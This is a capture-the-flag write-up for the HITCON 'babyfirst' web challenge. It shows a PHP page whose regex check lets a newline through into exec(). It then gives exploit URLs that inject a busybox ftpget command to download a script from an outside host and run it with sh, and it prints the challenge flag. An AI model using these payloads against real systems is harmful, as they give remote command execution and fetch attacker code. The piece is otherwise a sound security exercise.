# babyfirst (web 100)

## Description

```
baby, do it first.
http://52.68.245.164
```

## The bugs

When you browse to the website, you see the PHP code that is running on index page.

```php
<?php
    highlight_file(__FILE__);

    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];
    if ( !file_exists($dir) )
        mkdir($dir);
    chdir($dir);

    $args = $_GET['args'];
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) )
            exit();
    }
    exec("/bin/orange " . implode(" ", $args));
?>
```

The program creates a sandbox directory using the `$_SERVER['REMOTE_ADDR']` (aka your IP address) if it doesn't exist already, and changes the directory into it. Then, it parses the GET parameter called `args`. The program iterates through `$args` array and verifies that they only contain letters, numbers and underscores.

However, it is possible to match with a string that ends with a new line (%0A). This allows us to inject custom shell commands when it does exec with our `$args`.


## Exploit

First, we run a shell command to download a shell script that we can execute later.

```
http://52.68.245.164/?args[]=aa%0a&args[]=busybox&args[]=ftpget&args[]=<IP_IN_DECIMAL>&args[]=script
``` 

Then, we run the downloaded script.

```
http://52.68.245.164/?args[]=aa%0a&args[]=sh&args[]=script
```

The shell script redirects output to a file which we can download by going to `/sandbox/<YOUR_IP>`. To get the flag, the script runs `/read_flag`.

## Flag

Flag: `hitcon{theworldisnotbeautiful,becauzeofyou}`
